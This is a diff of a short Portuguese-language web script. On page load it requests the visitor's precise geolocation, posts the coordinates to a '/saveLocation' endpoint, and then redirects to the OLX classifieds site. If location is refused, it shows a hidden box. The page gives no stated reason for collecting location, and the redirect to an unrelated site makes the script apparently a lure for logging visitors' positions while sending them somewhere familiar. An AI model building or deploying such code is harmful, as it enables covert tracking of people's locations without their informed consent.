@@ -1,28 +1,53 @@
+
 document.addEventListener('DOMContentLoaded', () => {
-    const content = document.querySelector('#content');
+    const box = document.querySelector('.box');
     
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
             saveLocation, 
-            (error) => errorSaveLocation(content),
+            (error) => errorSaveLocation(box),
             options
         );
     } else {
         console.log('Erro ao obter localização');
-    };
+    }
 });
 
-function saveLocation(position) {
-    const {latitude, longitude} = position.coords;
-    console.log(latitude.toString());
-    console.log(longitude.toString());
-}
-
-function errorSaveLocation(content) {
-    content.textContent = 'Não foi possível obter a localização';
-    content.style.color = 'red';
-}
-
 const options = {
-    enableHighAccuracy: true
+    enableHighAccuracy: true,
+    timeout: 5000
 };
+
+function saveLocation(position) {
+    const { latitude, longitude } = position.coords;
+    
+    
+    const latitudeString = latitude.toString();
+    const longitudeString = longitude.toString();
+
+    fetch('/saveLocation', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            latitude: latitudeString, 
+            longitude: longitudeString, 
+        }),
+    })
+    .then((response) => response.json())
+    .then((data) => {
+        
+        window.location.href = 'https://www.olx.com.br/'
+        console.log('Localização salva:', data);
+    })
+    .catch((error) => {
+        console.error('Erro ao salvar a localização:', error);
+    });
+}
+
+function errorSaveLocation(box) {
+    box.style.display = 'block'
+    
+}
+
